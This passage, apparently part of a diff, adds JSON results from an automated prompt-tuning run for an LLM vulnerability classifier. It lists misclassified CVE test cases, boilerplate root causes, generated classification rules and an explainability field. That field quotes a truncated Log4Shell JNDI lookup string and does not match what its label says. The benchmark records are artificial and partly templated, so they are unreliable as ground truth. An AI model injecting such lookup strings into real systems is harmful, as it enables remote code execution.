+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2021-44228-FIX",
+          "category": "False Positive",
+          "reason": "Model over-aggressively flagged benign code/log as dangerous.",
+          "expected_status": "SAFE",
+          "predicted_status": "VULNERABLE"
+        }
+      ],
+      "root_causes": [
+        {
+          "case_id": "CVE-2024-3094",
+          "category": "Missing Safety Rule",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt lacks explicit handling for category 'Missing Safety Rule'.",
+          "impact_level": "Medium"
+        },
+        {
+          "case_id": "CVE-2023-38606",
+          "category": "False Negative",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt rules miss unescaped variable concatenation or indirect execution vectors.",
+          "impact_level": "High"
+        },
+        {
+          "case_id": "CVE-2023-4863",
+          "category": "Missing Safety Rule",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt lacks explicit handling for category 'Missing Safety Rule'.",
+          "impact_level": "Medium"
+        },
+        {
+          "case_id": "CVE-2021-3156",
+          "category": "False Negative",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt rules miss unescaped variable concatenation or indirect execution vectors.",
+          "impact_level": "High"
+        },
+        {
+          "case_id": "CVE-2021-44228-FIX",
+          "category": "False Positive",
+          "expected": "SAFE",
+          "predicted": "VULNERABLE",
+          "root_cause": "Prompt rules are too broad, causing benign queries or parameter bindings to be misflagged.",
+          "impact_level": "Medium"
+        }
+      ],
+      "generated_rules": [
+        {
+          "rule_id": "RULE_001",
+          "category": "Missing Safety Rule",
+          "rule_text": "+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules.",
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'Missing Safety Rule' failure patterns."
+        },
+        {
+          "rule_id": "RULE_002",
+          "category": "False Negative",
+          "rule_text": "+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None.",
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Negative' failure patterns."
+        },
+        {
+          "rule_id": "RULE_003",
+          "category": "False Positive",
+          "rule_text": "+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH.",
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Positive' failure patterns."
+        }
+      ],
+      "mutations_applied": [
+        {
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'Missing Safety Rule' failure patterns.",
+          "rule": "+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules."
+        },
+        {
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Negative' failure patterns.",
+          "rule": "+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None."
+        },
+        {
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Positive' failure patterns.",
+          "rule": "+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH."
+        },
+        {
+          "operation": "REORDER_INSTRUCTIONS",
+          "reasoning": "Enforced multi-finding schema, distinct CWE/OWASP classification, and zero-hallucination RELATED CVE rules (RELATED CVE: None for generic code)."
+        }
+      ],
+      "explainability": {
+        "what_changed": "Applied 4 targeted mutation operations.",
+        "why_changed": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'",
+        "failures_motivated": [
+          "Missing Safety Rule",
+          "False Negative",
+          "Missing Safety Rule"
+        ],
+        "confidence_score": 48,
+        "confidence_level": "Low"
+      }
+    }
+  ]
+}
